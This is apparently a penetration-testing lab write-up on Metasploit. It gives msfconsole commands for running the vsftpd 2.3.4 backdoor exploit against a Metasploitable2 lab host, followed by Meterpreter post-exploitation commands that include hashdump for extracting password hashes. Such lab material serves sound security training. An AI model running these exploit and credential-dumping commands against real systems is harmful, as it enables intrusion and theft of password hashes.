# Exploitation with Metasploit

## Objective
To utilize the Metasploit Framework to automate the exploitation of known vulnerabilities and perform post-exploitation tasks on a target system.

## Theory & Concepts
- **Metasploit Framework (MSF)**: The world's most used penetration testing platform.
- **Modules**:
  - **Exploits**: Code that takes advantage of a vulnerability.
  - **Payloads**: Code that runs on the target after exploitation (e.g., Meterpreter).
  - **Auxiliary**: Scanners, sniffers, and fuzzer tools.
  - **Post**: Modules for post-exploitation (gathering info, pivoting).
- **Reverse Shell**: A shell where the target connects back to the attacker (effective for bypassing firewalls).

## Tools Used
- Metasploit Framework (msfconsole)

## Commands & Practical Steps
- **Search for Exploit**:
  ```bash
  msfconsole
  search vsftpd_234
  ```
- **Exploit Configuration**:
  ```bash
  use exploit/unix/ftp/vsftpd_234_backdoor
  set RHOSTS 192.168.56.101
  exploit
  ```
- **Meterpreter Commands**:
  ```bash
  sysinfo      # Get system info
  hashdump     # Extract password hashes
  ls           # List files
  getuid       # Check current user
  ```

## Practical Demonstration Summary
Exploited a backdoor in the VSFTPD service on Metasploitable2 using Metasploit. Gained a root-level shell and performed basic post-exploitation activities, including system information gathering and password hash extraction.
